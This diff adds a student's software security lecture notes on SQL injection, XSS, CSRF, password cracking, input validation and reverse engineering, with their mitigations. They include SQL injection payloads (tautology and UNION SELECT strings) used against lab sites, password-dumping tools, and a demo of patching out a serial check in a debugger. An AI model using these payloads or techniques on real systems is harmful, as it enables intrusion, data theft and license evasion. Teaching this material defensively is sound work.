+-fill the forms out with benign input to see what request and response looks like
+
+-remember you don't need the webpage to send the request
+	-you just need to know what it looks like to replicate it
+
+badstore.net
+-look for xss attacks or anything
+
+"dom based xss"
+-could create a new form or anything with html
+
+Part 7
+Chapter 8
+
+SQL Injection
+
+SQL
+-structured query language
+-ANSI and ISO standard computer language
+-most current standard is SQL99
+
+SQL is a standard - but..
+-many different versions of the SQL language
+-most of SQL db programs also have their own proprietary extensions to the SQL standard
+
+SQL Data manipulation language (DML)
+-work with records in db
+
+SQL Data definition language (DDL)
+-table level
+-constraints, indices, 
+
+Metadata
+-almost all SQL DBs are based on the RDBM (Relational Database Model)
+-one important fact for SQL injection
+	-Amongst Codd's 12 rules for a Truly Relational Database System:
+		-metadata (data about the db) must be stored in the db just as the regular data is
+	-therefore, db structure can also be read and altered with SQL queries
+
+What is sql injection
+-the ability to inject SQL commands into the db engine through an existing application
+
+How common is it?
+-the most common vulnerability found
+-not a web server flaw or db flaw
+-a website vulnerability
+-it is a flaw in "web application" deveelopment
+
+Vulnerable Applciations
+-almost all SQL DBs and programming languages are potentially vulnerable
+	-MS SQL Server, Oracle, MySQL,Postgres, DB2, MS Access, Sybase, Informix, etc.
+-Accessed through applications developed using:
+	-Perl and CGI scripts that access DBs
+	-ASP,JSP,PHP
+	-XML,XSL, and XSQL
+	-Javascript
+	-VB, MFC, and other ODBC-based tools and APIs
+	-DB specific Web-based applications and APIs
+	-reports and DB applciations
+	-3 and 4 GL-based languages (C,OCI,Pro *C, and COBOL)
+	-many more
+
+How does SQL injection work?
+-common vulnerable login query
+
+	SELECT * FROM users where login = 'victor'
+	AND passwprd = '123'
+	(if it returns something then login!)
+	ASP/MS SQL SERver login syntax
+	var sql = "SELECT * FROM users
+	WHERE login = ' " + formusr + 
+	""AND password = '" + formpwd + "'";
+
+Injecting through strings
+
+formusr = ' or 1=1 --
+formpwd = anything
+
+final query looks like this:
+
+SELECT * FROM users WHERE username = '' or 1=1
+--AND password = anything
+we added ' or 1=1
+--
+
+
+
+tautology-always evaluates to true
+or 1=1 is tautology attack
+
+
+The power of '
+-it closes the string parameter
+-everything after is considered part of the SQL command
+-misleading internet suggestions include:
+	-Escape it!:replace ' with ''
+		-can't always blacklist ', sometimes you want to take in apostrophes
+-string fields are very common but there are other types of fields:
+	-Numeric
+	-Dates
+
+if it were numeric
+
+SELECT * FROM clients
+WHERE account = 12345678
+AND pin = 1111
+
+PHP/MySQL login syntax
+$sql = "SELECT * fROM clients WHERE" .
+"account = $formacct AND ".
+"pin = $formpin";
+
+-dont need quote attack here because the input type isn't a string
+
+Injecting numeric fields
+
+$formacct = 1 or 1=1 #
+$formpin = 1111
+
+Final query would look like this:
+	SELECT * FROM clients
+	WHERE account = 1 or 1=1
+	# AND pin = 1111
+
+SQL injection characters
+
+	' or " 		character string indicators
+	-- or # 	single-line comment
+	/*..*/ 		multiple-line comment
+	+ 			addition, concatenate (or space in url)
+	||			(double pipe) concatenate
+	% 			wildcard attribute indicator
+	?Param1=foo&Param2=bar 		URL params
+	PRINT 		useful as non transactional command
+	@variable 	local variable
+	@@variable 	global variable
+	waitfor delay '0:0:10' 	time delay
+
+-------------------------------------------------------
+
+Software Security Lecture 11 Notes
+
+final will count on sql injection xss and csrf a lot
+-know what the vulns are, what it looks like in code, and the mitigation
+-can look online at examples
+
+csrf is more architecture
+sql injection is looking at input and output validation
+xss if it can run javascript
+
+
+XSS
+What is it?
+	An attacker wants to be able to execute code in the browser in another domain
+What does it look like in code?
+	An application receives user input and reflects that input back to the user without proper encoding
+Mitigation
+	Input validation AND output encoding
+	Output encoding needs to be CONTEXTUALLY RELEVANT
+
+CSRF - Cross-Site Request Forgery
+What is it?
+	An attacker tries to cause your browser to inadvertantly submit a request to another page
+	-unbeknownst to the victim, usually while they are logged into that page
+what does it look like in code?
+	Nothing, b.c. it is the absence of verifying a form
+Mitigation
+	-Use CSRF token
+		-a unique identifier for the form so that the website can tell that the form came from a legitimate user and wasn't forged
+		-most legitimate
+	-referer header
+		-to see what page they came from
+		-won't always have a referer header though, so not best fix
+	-double submit cookie
+		-application places a token in the cookie that the application doesn't ahve to remember
+			-copies this information onto the form from the cookie using client-side javascript
+			-safe b.c. only client-side js from this website could access that cookie
+		-if user has scripting turned off then the double submit cookie won't work
+
+
+SQL Injection
+
+where 1=1 signature will be in most firewalls
+
+user ---firewall--DMZ----firewall ------backend
+				Web App						DB
+
+-could stop before he even gets in, or before he can execute anything, or before he can get anything out
+	-all count as unsuccessful
+
+-security problem is mainly fom show                                                                          
+Attack Scenario
+-app constructs sql query from parameter:
+sql_query = "SELECT........ request.getParameter("Month")
+	-we know this user input leaves a sql injection ..
+
+Attack Scenario
+Sets month = 0 and 1=0
+
+
+Attack Scenario
+-removing credit card from schema
+
+Solutions
+-Whitelisting over Blacklisting
+	-whitelisting is a strong control b.c. it controls input
+	-should be using prepare statements anyway
+-defense in depth
+-input validation and escaping
+
+Blacklisting doesn't work
+-other queries that don't require the singl tick
+-numeric parameters
+
+whitelisting
+-only allow input within well-defined set of safe values
+-regex is whitelisting
+	-must be careful that it is accurate
+
+second-order sql injection
+-put raw input into db and pull that data back out to use it in a query later
+	-can still be used for an exploit
+
+
+*****actual fix for sql injection
+prepared statements AND bind variables
+-precreate the statement and bind the variables to this statement
+-parameterized query is same thing
+-metachars - provide distinction b.w. data and control in queries
+	-most attacks: data interpreted as control
+	-alters the semantics of a query
+-bind variables: ? placeholders guaranteed to be data (not control)
+-prepared statements allow creation of static queries with bind variables
+	-preserves the structure of intended query
+	-parameters not involved in query parsing/compiling
+
+-in code 
+	Java
+	PreparedStatement ps = db.prepareStatement("Select pizza, toppings,quantity,order_day" + "FROM orders WHERE userid = ? AND order_month=?");
+	ps.setInt(1,session.getCurrentUserId());
+	ps.setInt(2,Integer.parseInt(request.getParameter("month")));
+	ResultSet res = ps.executeQuery();
+
+	-query parsed w.o. parameters
+	-bind variables are typed: input must be of expected type (e.g. int, string, etc.)
+
+	PHP
+	$ps = $db->prepare('Select pizza, 
+			toppings,quantity,order_day ' + 'FROM orders WHERE userid=? AND order_month=?');
+	$ps->execute(array($current_user_id,$month));
+	-no explicit typing of parameters like in java
+
+	SQL stored procedures
+	-stored procedure: sequence of SQL statements executing on specified inputs
+	-SPs still vulnerable to sql injection
+
+	Ex: CREATE PROCEDURE chagne_password
+						@username VARCHAR(25),
+						@new_passwd VARCHAR(25) AS
+		UPDATE USERS SET passwd = new_passwd wHERE uname=username
+
+	Vulnerable use
+		$db->exec("change_password '"+$uname+"','"+new_passwd+"'");
+
+	Instead use bind variables w/stored procedure:
+		$ps = $db->prepare("change_password ?,?");
+		$ps->execute(array($uname,$new_passwd));
+
+
+Mitigating the impact of sql injection attacks
+-prevent schema & information leaks
+-limit privileges (defense-in-depth)
+-encrypt sensitive data stored in database
+-harden db server and host O/S
+-apply input validation
+
+Prevent schema & information leaks
+-knowing db schema makes attacker's job easier
+-blind SQL injection: attacker attempts to interrogate system to figure out schema
+-prevent leakages of schema information
+-don't display detailed error messages and stack traces to external users
+
+Limiting privileges
+-apply principle of least privilege! Limit
+	-read access, tables/views user can query
+	-commands (are updates/inserts ok?)
+-no more privileges than typical user needs
+-Ex: could prevent attacker from executing INSERT and DROP statements
+	-but could still be able to do SELECT attacks and compromise user data
+	-not a complete fix, but less damage
+
+Encrypting sensitive data
+-encrypt data stored in the database
+	-second line of defense
+	-w/o key, attacker can't read sensitive info
+-key management precautions: don't store key in DB, attacker just use SQL inkects again to get it
+-some DBs allow automatic encryptino, but these still return plaintext queries
+
+Hardening DB server and Host O/S
+-dangerous functions could be on by default
+-Ex: Miscrosoft SQL Server
+	-allows users to open inbound/outbound sockets
+	-attacker could steal data, upload binaries, port scan victim's network
+-disbale unused services and accounts on OS (Ex: no need for web server on DB host)
+
+Applying input validation
+-validation of query parameters not enough
+-validate all input early at entry point into code
+-reject overly long input (could prevent unknown buffer overflow exploit in SQL parser)
+-redundancy helps protect systems
+	-e.g. if programmer forgets to apply validation for query input
+	-2 lines of defense
+
+-for in class take screen shots of credit cards being spit out and upload to bboard
+
+zap and burp are cool testing software
+
+-in class assignment lecture 11 1hr 5 minutes
+	-can go download badstore @ badstore.net or do it against
+	testfire.net
+
+	ON 1=1 -- 
+
+	should auth as test user
+	-now login as admin using sql injection
+	admin' /*
+	admin' --
+
+	get other stuff to print out
+
+	ON 1=1 AND email LIKE '%%' -- 
+
+	-from search bar
+
+	' UNION SELECT @@ VERSION, null,null,null
+-if you run out of space on a query just type it into url directly
+-burp can turn off all client-side control
+
+	' Union SELECT email,null,null,null FROM userdb
+
+- to find code look for badstore.cgi
+-using prepare doesn't protect it- also need to use blind variables
+
+-have to deploy acmebank like a webapp using iis
+	-could just do a code review on it
+	-or could download broken webapp vm from owasp (matilla day) wwa
+
+-implement more rules on sql injection project than the ones he gave us
+
+
+-------------------------------------------------------
+
+Software Security Lecture 12 Notes
+
+-not grading blog
+
+Final
+-first part is only buffer overflow review
+-xss, csrf,sql injection
+	-know what it is, what it looks like in code, and how to fix it
+-might be miscellaneous ? on passwords
+
+static analyzer
+	-pretty good at finding buffer overflow
+	    -don't always know whre input is coming from, so it might find a buffer overflow point that is inaccessible
+	-pretty good at finding xss
+		-follows input/output from start to finish to make sure everything is encoded
+	-pretty good at sql injection
+		-can look to see if you have binded variables
+	-not very good at csrf
+		-usually says you have a vuln
+		-maybe if you were using standard frameworks
+
+good article - checkmarx
+	XSS the definitive guide to prevention
+
+
+-dom based xss is most prevalent web vuln
+
+
+Passwords for authentication
+
+Cracking the Nut
+-password cracking demystified
+	-take a list of hashed or encrypted passwords and try to find their plaintext, or find a password that hashes to the same value
+-Uses
+	-password recovery
+		-if you lose your password they can get it back
+	-password auditing
+		-determining if passwords are crackable
+		-like pentesting yourself
+	-unauthorized access
+-password protectino
+	-Integrated Windows Authentication
+		-LM,NTLM(v1,v2),Kerberos
+		-you say I want to auth and these are the algorithms I know
+	-*nix
+		-DES,md5,Blowfish,SHA-1+,salting
+-Password Weaknesses
+	-meatware weaknesses
+		-we create weak passwords
+		-humans write them in places they can remember them
+		-write them down, etc.
+		-password reuse
+		-social engineering
+	-LM hash weaknesses
+		-LanMan
+	-susceptibility to rainbow attacks
+		-dictionary attack is you have a list of words that you will hash and then compare these hashes to the password file (Assume no salt)
+		-brute force - try every combination of characters, and hash each one and then compare to password file
+		-rainbow attack-tradeoff b.w. dict. and brute force attack
+			-calculates a hash chain
+				-could include a wide range of number of passwords
+			-store the start of a chain (Dictionary entry) and end of chain
+				-can figure out if a password exists in a chain quickly and then brute force the chain
+			-salts make it harder b.c. you would need to generate a rainbow table for each individual salt
+	-password policy/complexity weaknesses
+		-something like 10-15 characters with at least 1 special, 1 upper case, and 1 number
+-Cracker features
+	-dictionary attack (forward search)
+	-word mangling dictionary attacks
+	-brute force attack
+	-rainbow tables
+-Freeware tools
+	-cain and abel
+	-john the ripper
+	-ophcrack
+	-hydra
+	-mdcrack
+-COTS tools
+	-LC5/ L0phtcrack 6
+	-Elcomsoft Password Recovery
+-Offline Cracking
+	-pwdump (Win SAM file)
+		-local and cahced passwords
+	-Isadump (LSA secrets)
+		-domain, FTP, services passwds
+	-etc/shadow
+	-require admin privs
+-our experiment
+	-password cracking and multiprogramming
+	-Elcomsoft cs. Cain & Abel
+	-Multiprocessor Cluster vs. Video Card
+-Software Comparison
+	-Elcomsoft vs. Cain and Abel
+	-Pentium Core-Duo, 4GB Ram
+	-C & A yielded 4M pass/sec
+	-Elcomsoft yielded 8M pass/sec
+-Hardware comparison
+	-7 Quad-core (28c) servers vs. 2 video cards
+	-280core servers yielded ~ 100M pass/sec
+	-2 video cards yielded ~ 800M pass/sec
+
+Input Validation
+-Some potential sources of input
+	-command line
+	-environemtn variables
+		-including PATH
+	-Files
+		-file descriptors
+		-config files
+		-temorary files
+	-databases
+	-network services
+	-registry values
+	-system properties
+-command line
+	-we went over with buffer overflow
+-ARg0
+	-filename
+-Environment variables
+	-maintain general state information
+	-i.e. PATH,SHELL,USERNAMe
+-Env Reccomendations
+	-for setuid or otherwise privileged code
+		-determine set of required environment variabels
+-file descriptors
+	-hold references to open files
+	-unix programs expect a standard set of open file descriptors
+		-stdin
+		-stdout
+		-stderror
+	-these may or may not be attacked to the console
+		-a calling program can redirect input and output
+-file descriptor reccomendations
+	-do not assume taht stdin, stdout, stderr are connected to a console
+	-it is the nature of uniz that thse file descriptors are easily reste
+	-confirm that stdin, stdout,stderr do not equal any file descriptors taht you open
+	-this may be considered a bit paranoid as linux solaris, probably others open standard fds on high numbered file descriptors
+-file contents
+	-validate any file contents you read
+	-don't assume taht the file will ahve good input
+-other inputs
+	-anything that your app uses that comes from OS services
+		-current directory
+		-sginals
+-Validation approach: 
+	-Numeric
+	    -if signed should allow neg and pos
+	    -if unsigned check minimum
+	-string
+		-use a template
+		-white lists
+		-grammatical check
+		-unbounded string
+			-use some form of blacklisting, or character escaping, size restrictions
+-strong validation
+	-default deny much easier to enforce
+		-allowing only input that matches a formal definition of correctness
+	-default allow not a good idea
+-whitelisting
+	-map restricted integer range to list of valid integers
+	-enumeration
+		-define fixed set of valid values
+		-verify that the input exactly matches the input
+-whitelisting - regular expressions
+	-basically the same thing
+	-difficulty is if you have actually thoguht about every possibility from the regex
+	-regex: string that describes a pattern
+		-syntax varies based on language
+	-can use online validators
+	^[a-zA-Z0-9]{1,8}(\.[a-zA-Z0-9]{1,3})?$
+
+	-can have 1 to 8 alpha numeric characters in first section
+	-then must be a period and 1 to 3 alpha-numeric characters
+		-those are optional b.c. of the ?
+	Abc     	matches
+	Abc. 		fails
+	Abc.def 	matches
+	Abc.defg 	fails
+-Format of a Regex
+	-consists of branches separated by a |
+		-each branch is a possible match pattern
+		Ex:
+			abc |def will match the strings abc or def
+	-each branch consists of more pieces concatenated together
+	-a piece is composed of an atom possibly followed by a range indicator or bound
+		Ex: a*, a{1,3}. (abc)?, [abc]+
+		* means any number of times
+		+ has to be there at least 1 time but could be there more
+-Atoms
+	-simplest form is a single character
+	-can be an embedded regular expression
+	-can represent the empty set
+	-special atoms
+-Simple examples
+	-any string of 15 charactesr
+		.[0,15]
+	-a simple university class identifier
+-for project go really heavy on regex and let it do the work
+-use rules for area codes, etc.
+
+
+-------------------------------------------------------
+
+Software Security Lecture 13 Notes
+
+What is reverse engineering
+-the study and dissection of an engineering artifact in order to:	
+	-discover its purpose
+	-produce a similar artifact or technique
+	-enhance the state of the art
+
+
+Uses
+-positive
+	-understanding malware and identifying indicators
+	-verifying an executable does what it says it does and nothing more
+	-enhancing your general understanding of software and hardware
+-negative
+	-stealing software by evading licensing protections
+	-stealing intellectual property
+
+Disclaimer
+-abuse of the knowledge and skills you learn in this class will have negative ramificiations academically, professionally, and possibly legally
+-do you really need another "Free" app? wOuld you want someone stealing your work in a couple years? have you seen the academic pricing the SMU computer store offers?
+
+Why assembly language?
+-REgardless of language, all code must exist as machine instructions at some point. Why learn all languages when you can sharpen your skills with assembly and handle anything. who remembers Delphi?
+-if you can interpret machine instructions taht are exectued you can reverse engineer the software.
+-decompilers which reconstruct high-level language fromt he machine instruction may obscure important details. They can also be mislead by skilled coders trying to make your job difficult
+
+Refresher
+-computer organization - the abstract design of microprocessor and memory components
+-Assembly language - a human- readable listing of the instructions represented by machine code
+-CISC vs. RISC
+    -comple instruction set
+    -reduced instruction set
+
+Nibbles and bits
+-bit is a binary digit
+-4 bits = nibble
+-8 bits = byte
+-16 bits = word
+-32 bits = double word or dword
+-64 bits are a quad word or qword
+
+
+Little endian vs. big endian
+-nibbles and larger groups of bits are generally represented in hexadecimal
+-little endian
+	-least significant byte first
+		ex: dword 0x1234abcd is stored cd ab 34 12
+	-intel uses this format
+-big endian
+	-most significant byte first
+		-ex: dword 0x1234abcd = 12 34 ab cd
+	-java uses this format
+
+What does it all mean?
+-there is no inherent meaning to any given bit of information
+-any given byte could be:
+	-an ASCII character, or part of a multibyte character, such as unicode
+	-a number, or part of a number
+	-an instruction or part of one
+	-a bit field or a collection of bits taht happen to be adjacent
+
+bit storage
+-ASCII - chars represented in hex digits 0x00 to 0x7F
+-unsigned int - sum (for each bit postiion), the bit times 2 to the bits position form the right minus 1
+-signed 2's comp - to convert pos to neg
+	-invert the bits and add 1
+		5=0101 to get -5 invert (1010) and add 1 = 1011
+	-to sign extend pad the higher bits with MSb
+		0101 becomes 00000101
+		1011 becomes 11111011
+
+Floating-point formats
+-composed of a sign bit, exponent bits, and Mantissa bits
+	-can represent +/- 0 +/- infinity. Not a number NaN or very wide range of real numbers
+	-generally 32 or 64 bits
+
+Machine code
+-each byte has some inherent meaning to a processor (i.e. instruction prefix)
+-some instructions require multiple bytes
+-not all sets of bytes result in valid instructinos
+-a human-readable listing of the isntructions represented by a stream of bytes is called an Assembly listing
+
+Bit fields
+-each bit in an array of bytes could be assigned a meaning that is independent of its neighbors
+-the EFLAGS register in one such example
+	-bit 0 - carry flag
+	-bit 2 - parity flag
+	-bit 6 - zero flag
+	-bit 7 - sign flag
+
+Intel x86 Platform GPRs
+-9 general purpose registers (GPRs)
+-EAX - accumulator
+-EBX - could be used for multiple things
+-ECX - counter used for loops
+-EDX - data used in conjunction w. EAX for some math operations
+
+Intel x86 PLatform GARs
+-5 general address registers (GARs)
+-ESP - stack ptr - top of stack
+-EBP - base ptr - stack frame ptr
+-ESI - source index - for moving memory
+-EDI - dest. index - for moving meory
+-EIP - instruction ptr - currently executing isntruciton
+
+Hex editor
+-program that lets you view a file as a series of hexadecimal digits
+-ASCII equivalents are usually displayed
+-allows for editing
+-displays offset information
+-file diff and checksum capability
+-essential tool for binary modification
+
+Disassembler
+-linear disassembler - start at beginning and run straight through
+	-variable length op-codes make sthis technique susceptivle to obfuscation
+-recursive disassemblers - start disassembly at the beginning and follow the code flow to determine the next address to disassemble
+	-less susceptible to obfuscation
+	-may be locations in the file which are overlooked
+
+Debugger
+-usually contain a disassembler
+-execute the binary
+	-watch values in register and memory
+	-step through instructions
+	-follow calls and jumps
+	-set breakpoints
+	-handle errors
+
+how a debugger traces
+-debuggers use interrupts in order to trace or breakpoint a progrma
+-INT 1 causes exception_single_step
+	-it would be possible but crude to replace next instruction with INT 1 for each
+	-in the EFLAGS register, Flag 8 is the Trap Flag
+	-so debuggers modify the EFLAGS register in order to cause an exception after each instruction
+
+How a debugger breakpoints
+-INT3(0x0cc) or INT3 (0x0cd 0x03) cause Exception_breakpoint
+-when you set a breakpoint, (generally) the debugger
+	-copies the byte at the bp addresss to a look up table
+	-writes 0x0cc to the bp address
+-when the program hits the bp
+	-an exception occurs, which transfers control to the debugger
+	-the debugger obtains the original byte from the loopup table in order to display and process the instruction
+
+Gotchas
+-assumptions about the programming language used to create the executable
+	-did the arguments to the procedure call get added to the stack right to left or left to right
+	-is this an object oriented language with inherited methods and class variables?
+	-what does a string look like?
+
+Static vs. dynamic analysis
+-do you really want to run that bit of code you found on the internet w.o having the least clue about what it does?
+-static analysis - studying the code without actually executing it. Consdier using IDA pro for this
+-dynamic analysis - studying the code as it executes (multiple times). this is what we will focus on in this class. Ollydbg is great for this and free!
+
+
+Anti-debugging techniques
+-IsDebuggerPresentAPI
+-Int 3h search -search for breakpoint interrupts
+-CreateFileA - try to create a file with the same name as debugger in the same directory
+-Invalid instructions - may cause debugger to crash
+-search for evidence of debugger - i.e. registry
+-checksum the executable (not very effective)
+	-could just copy the executable
+-checksum the text segment (run-time)
+-decoy code
+	-extra code to confuse attacker
+-binary obfuscation
+	-use complicated loops and condition statements
+
+ollydebug is mirrored on softpedia
+-soemtimes run as admin, sometimes run as normal user
+-can drop an exe in 
+-he was running on a windows vm
+
+demo with binary1.exe
+-code has security check looking for ollydb
+-didn't find it so we're good
+	-in theory you would find where that was an noop it out
+
+if you type in a name and serial # it says invalid serial
+	-could find where serial check is and defeat that check
+		-jump to good path instead of bad
+	-addresses should be 401 something usually
+	-we see registration error a few times, we could try to figure out where that is being called
+-if you adjust something and click assemble it only changes it temporarily
+-to change it permanently you need to copy to executable and then save
+
+-can look for invalid serial text and change to noop
+
+
+-------------------------------------------------------
+
+Software Security Lecture 14 Notes
+
+Review
+
+Buffer Overflow is only previous topic that will be covered from before the midterm
+
+Buffer Overflow
+-why does it happen in c++
+-doesn't enforce string bounds checking or typing
+-prone to buffer overflow because coders make mistakes like not doing bounds checking
+	-confusing because strings start at 0 and have to end with null
+	-2 mathematical problems
+	-also library routines that are also vulnerable to buffer overflow
+-how do you find all buffer overflows
+	-look for string manipulation, string calculations, pointer manipulation
+	-need user input
+	-sometimes using a pointer to point to array can lead to buffer overflow
+-how do memory segments affect buffer overflow
+	-be able to explain difference b.w. heap overflow and stack overflow
+		-on stack (return pointers local variables, stack base pointers)
+		-on heap (Dynamically allocated variable, heap meta variables)
+	-if variable in data segment is overflow it is overflown into other data
+		-harder to get control of application
+		-could potentially overwrite from one segment to another
+-review function call walkthrough
+	-be able to explain why an application would crash based on an input 
+-alternative functions
+	-strncpy (doesn't use null terminator), strlcpy (does null termination)
+		-why is size used instead of integer
+			-because integer can overflow to negative
+-OS approaches to mitigating buffer overflow
+	-stack guard, canary, stack analysis, non-executable stacks, ASLR
 
 
 
 
+
+
+Cross-domain security policy (same origin policy)
+	-understand policy
+	-scripts can only access properties of documents of the same origin
+	-scripts can only access documents of that page that domain
+	-origin changes if port, protocol, host name changes
+	-dom protected separately
+	-can link, could embed frames, could submit forms
+	-can't run script on another website, or access cookie of another website
+	-know limitations and valid interactions
+
+CSRF
+	-architectural issue 
+		-didn't build in a way to website to distinguish forged form from valid form
+	-have to fix across entire application
+	-can submit form to another website
+	-can a website tell the difference b.w. a post from another website and a user who is actually using the valid website
+	-know how to test for it
+		-if page contans form copy that onto html page
+		-then write the javascript that submits that form
+		-create a hidden frame and then the document 
+		-don't include data you wouldn't have as an attacker
+		-must be a blind attack
+-impact
+	-what could you do
+	-cause someone to do bank transaction unknowingly
+	-get request shouldn't affect state of system
+-fix 
+	-is develop method to be able to tell difference b.w. forged request and real
+    -place hidden token in form
+        -could use referrer header
+	         -sometimes there is no referrer header (either breaks request, or you have to accept)
+		     -both bad
+    -double submit cookie
+    	-javascript grabs something out of cookie on the page that the attacker could not have grabbed
+    	-if this value matches cookie the page can just check this value in the cookie to verify they match 
+		-slide 14 on cross domain sec.
+
+
+XSS
+-could set up key recorder to send key strokes somewhere
+-when malicious script is executed in anothe domains context
+-link, forged email, spoofed email () (usually requires some social engineering)
+-could have stored XSS where all they have to do is visit page
+-application takes in user input and echos it back out
+	-could take out characters from input, or encode output
+-if they fall for a XSS and they aren't logged in
+	-sometimes a user needs to be logged in for a malicious link to get fired
+		-sometimes after they login same request won't get fired
+-could modify webpages, steal cookies, further phishing attacks to ask for SSN
+-can come from anywhere
+	-entire http payload is user controlled
+	-anywhere in http headers, url, anything on a form, cookie, referrer header, as well as just things in a form
+-reflected vs stored XSS
+	-reflected happens one at a time, but stored will make it on the page for anyone that visits
+-preventing it
+	-combine several approaches
+	-sanitize or encode user input before outputting it anywhere
+		-input validation but better is output encoding
+			(html encoding, json escaping, url encoding,CSS)
+			-know what html encoding vs url encoding looks like - in slides
+-input validation doesn't fix anything alone
+	-it can help but
+	-output sanitization is the real fix
+
+SQL Injection
+-prepare query, bind the variables, and then execute the query
+-impact of sql injection
+	-login, dump tables, MSSQL Server lets you compile code, execute system commands etc. with the SQL
+-most impactful and critical of web vulnerabilities
+-prevent
+	-parameterize queries use bind variables
+	-whitelisting (input validation)
+-uninstall components of the DB that are not being used
+-know how to find code for sql injection
+-stored procedure could also be vulnerable if takes input 
+-if http only flag is on then browser should not let you access cookie
+	-browser dependent however (sometimes things on the page need stuff in the cookie, so this isn't always possible)
+
+-know what it is, what it looks like in code, and how to fix it in code
+
+
+-------------------------------------------------------
+
+End of Class
 
 
 
